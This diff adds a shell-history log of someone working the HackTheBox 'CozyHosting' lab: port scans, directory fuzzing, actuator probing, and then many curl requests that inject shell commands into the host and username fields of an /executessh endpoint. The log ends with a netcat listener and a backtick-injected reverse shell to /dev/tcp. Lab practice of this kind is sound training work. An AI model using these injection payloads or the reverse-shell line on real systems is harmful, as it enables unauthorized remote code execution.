@@ -1,0 +1,108 @@
+[2026-02-21 12:15:09] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/cozyhosting
+[2026-02-21 12:18:14] [pane=%0] [CMD] echo export IP=10.129.229.88 > ~/.ip
+[2026-02-21 12:20:03] [pane=%0] [CMD] nmap -p- --min-rate 3000 -Pn -oA nmap/cozyhosting $IP
+[2026-02-21 12:20:42] [pane=%0] [CMD] echo $IP
+[2026-02-21 12:20:58] [pane=%0] [CMD] source ~/.ip
+[2026-02-21 12:21:00] [pane=%0] [CMD] echo $IP
+[2026-02-21 12:21:06] [pane=%0] [CMD] nmap -p- --min-rate 3000 -Pn -oA nmap/cozyhosting $IP
+[2026-02-21 12:22:39] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/cozyhosting.nmap | cut -d/ -f1 | paste -sd,)
+[2026-02-21 12:22:44] [pane=%0] [CMD] echo $ports
+[2026-02-21 12:23:37] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/cozyhostingServicesVersions $IP
+[2026-02-21 12:24:14] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-02-21 12:25:23] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/cozyhostingServicesVersions $IP
+[2026-02-21 12:41:05] [pane=%0] [CMD] searchsploit nice admin
+[2026-02-21 12:41:09] [pane=%0] [CMD] searchsploit niceadmin
+[2026-02-21 12:44:45] [pane=%0] [CMD] searchsploit nginx
+[2026-02-21 12:49:35] [pane=%1] [CMD] ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v -X GET
+[2026-02-21 12:56:02] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/cozyhosting
+[2026-02-21 12:56:37] [pane=%1] [CMD] ll
+[2026-02-21 12:56:52] [pane=%1] [CMD] vim logs
+[2026-02-21 12:56:58] [pane=%1] [CMD] cd logs
+[2026-02-21 12:56:59] [pane=%1] [CMD] ll
+[2026-02-21 12:57:15] [pane=%1] [CMD] vim ffufCozyhosting
+[2026-02-21 13:18:45] [pane=%1] [CMD] ffuf -u http://cozyhosting.htb/actuator/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v -X GET
+[2026-02-21 13:26:09] [pane=%0] [CMD] locate -r nse$|grep spring4shell
+[2026-02-21 13:26:29] [pane=%0] [CMD] locate -r nse$ | grep "spring"
+[2026-02-21 13:26:40] [pane=%0] [CMD] locate nmap
+[2026-02-21 13:28:47] [pane=%0] [CMD] ls /usr/share/nmap/scripts/ | grep -i spring
+[2026-02-21 13:29:00] [pane=%0] [CMD] grep -ri "spring" /usr/share/nmap/scripts/*.nse
+[2026-02-21 13:32:36] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/cozyhosting
+[2026-02-21 13:32:38] [pane=%2] [CMD] ll
+[2026-02-21 13:32:55] [pane=%2] [CMD] wget https://raw.githubusercontent.com/fullhunt/spring4shell-scan/refs/heads/master/spring4shell-scan.py
+[2026-02-21 13:32:56] [pane=%2] [CMD] ll
+[2026-02-21 13:33:21] [pane=%2] [CMD] chmode +x spring4shell-scan.py
+[2026-02-21 13:33:31] [pane=%2] [CMD] chmod +x spring4shell-scan.py
+[2026-02-21 13:33:45] [pane=%2] [CMD] ./spring4shell-scan.py
+[2026-02-21 13:33:52] [pane=%2] [CMD] ./spring4shell-scan.py -h
+[2026-02-21 13:34:53] [pane=%2] [CMD] ./spring4shell-scan.py -u cozyhosting.htb
+[2026-02-21 13:35:25] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb
+[2026-02-21 13:36:04] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator
+[2026-02-21 13:36:31] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator/beans
+[2026-02-21 13:38:59] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator/sessions
+[2026-02-21 13:39:13] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator/health
+[2026-02-21 13:39:33] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator/env
+[2026-02-21 13:39:43] [pane=%2] [CMD] ./spring4shell-scan.py -u http://cozyhosting.htb/actuator/mappings
+[2026-02-21 13:40:46] [pane=%2] [CMD] curl -s http://cozyhosting.htb/actuator | head -50
+[2026-02-25 06:06:48] [pane=%2] [CMD] : #note this is a noter
+[2026-02-25 06:09:40] [pane=%2] [CMD] echo export IP=10.129.7.189 > ~/.ip
+[2026-02-25 06:10:37] [pane=%2] [CMD] sudo vim /etc/hosts
+[2026-02-25 06:12:24] [pane=%2] [CMD] ll
+[2026-02-25 06:23:56] [pane=%2] [CMD] curl -s http://cozyhosting.htb/executessh | head -50
+[2026-02-25 06:29:00] [pane=%2] [CMD] curl -s http://cozyhosting.htb/executessh | head -50
+[2026-02-25 06:30:51] [pane=%2] [CMD] curl -d http://cozyhosting.htb/executessh | head -50
+[2026-02-25 06:31:01] [pane=%2] [CMD] curl -d POST http://cozyhosting.htb/executessh | head -50
+[2026-02-25 06:31:42] [pane=%2] [CMD] curl -d POST http://cozyhosting.htb/admin/executessh | head -50
+[2026-02-25 06:57:16] [pane=%2] [CMD] curl POST http://cozyhosting.htb/admin/executessh -d host=MyOtherRide.com&username=YourMom
+[2026-02-25 06:57:27] [pane=%2] [CMD] curl POST http://cozyhosting.htb/executessh -d host=MyOtherRide.com&username=YourMom
+[2026-02-25 06:59:22] [pane=%2] [CMD] curl POST http://cozyhosting.htb/executessh -d 'host=MyOtherRide.com&username=YourMom'
+[2026-02-25 06:59:52] [pane=%2] [CMD] curl POST http://cozyhosting.htb/executessh -d 'host=MyOtherRide.com&username=YourMom'
+[2026-02-25 07:00:04] [pane=%2] [CMD] curl POST http://cozyhosting.htb/executessh -d 'host=MyOtherRide.com&username=YourMom' -v
+[2026-02-25 07:00:34] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=MyOtherRide.com&username=YourMom' -v
+[2026-02-25 07:05:41] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=id&username=YourMom' -v
+[2026-02-25 07:05:58] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=id&username=id' -v
+[2026-02-25 07:06:54] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=google.com;id&username=id' -v
+[2026-02-25 07:07:07] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=google.com`id&username=id' -v
+[2026-02-25 07:07:37] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=myOtherRide.com&username=id' -v
+[2026-02-25 07:08:09] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=id' -v
+[2026-02-25 07:13:31] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1;id&username=id' -v
+[2026-02-25 07:13:39] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=id' -v
+[2026-02-25 07:14:08] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=id&username=id' -v
+[2026-02-25 07:14:22] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1|id&username=id' -v
+[2026-02-25 07:14:40] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1`id&username=id' -v
+[2026-02-25 07:14:56] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1$IFS&username=id' -v
+[2026-02-25 07:15:04] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=$IFS&username=id' -v
+[2026-02-25 07:17:11] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=||id&username=id' -v
+[2026-02-25 07:17:28] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1||id&username=id' -v
+[2026-02-25 07:17:49] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1||id&username=yourMom;id' -v
+[2026-02-25 07:18:13] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=yourMom;id' -v
+[2026-02-25 07:18:45] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=yourMom' -v
+[2026-02-25 07:18:54] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=yourMom||id' -v
+[2026-02-25 07:20:29] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin' -v
+[2026-02-25 07:20:40] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin||id' -v
+[2026-02-25 07:21:08] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin||ls' -v
+[2026-02-25 07:21:21] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=ls' -v
+[2026-02-25 07:23:49] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin||ls' -v
+[2026-02-25 07:26:28] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1||id&username=admin' -v
+[2026-02-25 07:27:15] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&&id&username=admin' -v
+[2026-02-25 07:27:41] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin&&id' -v
+[2026-02-25 07:29:39] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1;username=id' -v
+[2026-02-25 07:29:59] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin&&id' -v
+[2026-02-25 07:31:03] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1%26&&username=admin&&id' -v
+[2026-02-25 07:31:39] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=admin%26&id' -v
+[2026-02-25 07:33:52] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1' -d 'username=admin%26&id' -v
+[2026-02-25 07:35:24] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1' -d 'username=admin&id' -v
+[2026-02-25 07:35:59] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1' -d 'username=admin%26id' -v
+[2026-02-25 07:36:43] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1' -d 'username=admin%26ls' -v
+[2026-02-25 07:37:02] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=' -d 'username=admin%26ls' -v
+[2026-02-25 07:37:17] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1' -d 'username=admin%26ls' -v
+[2026-02-25 07:47:39] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin||ls' -v
+[2026-02-25 07:47:47] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin||id' -v
+[2026-02-25 07:50:47] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin&&id' -v
+[2026-02-25 07:51:06] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin;;id' -v
+[2026-02-25 07:51:28] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin`id' -v
+[2026-02-25 07:51:51] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin||id||' -v
+[2026-02-25 07:52:01] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin`id`' -v
+[2026-02-25 07:52:45] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin`ls`' -v
+[2026-02-25 07:53:38] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin`id`' -v
+[2026-02-25 08:07:42] [pane=%3] [CMD] rlwrap nc -lnvp 42069
+[2026-02-25 08:08:32] [pane=%2] [CMD] curl http://cozyhosting.htb/executessh --data-urlencode 'host=127.0.0.1' --data-urlencode 'username=admin`sh -i >& /dev/tcp/10.10.14.4/42069 0>&1`' -v
